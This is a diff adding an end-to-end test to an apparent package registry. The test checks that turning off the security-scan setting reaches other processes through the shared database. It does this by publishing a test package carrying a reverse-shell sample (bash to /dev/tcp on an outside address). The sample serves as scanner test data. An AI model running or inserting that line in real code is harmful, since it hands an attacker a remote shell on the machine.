@@ -2,6 +2,7 @@ import request from 'supertest';
 import { ADMIN, DEVELOPER, createTestApp, type TestContext } from './app-factory';
 import { makeNpmTarball } from './fixtures';
 import { getConfig, getEnvConfig } from '../src/config/config';
+import { clearDictionaryOverrides, refreshDictionaryOverrides } from '../src/config/overrides';
 
 /** 与 security.e2e-spec 同款恶意样本：扫描开启时命中 critical 被拦截 */
 const REVERSE_SHELL = `const { exec } = require('child_process');\nexec('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1');\n`;
@@ -251,5 +252,24 @@ describe('字典管理（e2e）', () => {
       .auth(DEVELOPER.username, DEVELOPER.password)
       .expect(200);
     expect(on.body.data.securityScanEnabled).toBe(true);
+  });
+
+  it('字典变更自动同步到其他角色进程：清空内存覆盖层后仍按 DB 值放行 publish', async () => {
+    await saveDict(ctx, { 'security.scanEnabled': false }).expect(200);
+
+    // 模拟 npm / pypi 进程：它们的进程内覆盖层从未收到保存通知（旧实现在此仍会扫描）
+    clearDictionaryOverrides();
+    // 下一次 getConfig() 惰性回读共享库，自动拿到 console 刚保存的值
+    expect(getConfig().security.scanEnabled).toBe(false);
+    expect(getEnvConfig().security.scanEnabled).toBe(true);
+
+    // 关键断言：与 publish 走同一条扫描开关读取路径，恶意包应被直接放行入库
+    const crossProc = await makeNpmTarball('e2e-dict-crossproc', '1.0.0', {}, { 'index.js': REVERSE_SHELL });
+    await publish(ctx, 'e2e-dict-crossproc', '1.0.0', crossProc).expect(201);
+
+    // 恢复扫描开启，避免影响后续用例
+    await saveDict(ctx, { 'security.scanEnabled': true }).expect(200);
+    refreshDictionaryOverrides();
+    expect(getConfig().security.scanEnabled).toBe(true);
   });
 });
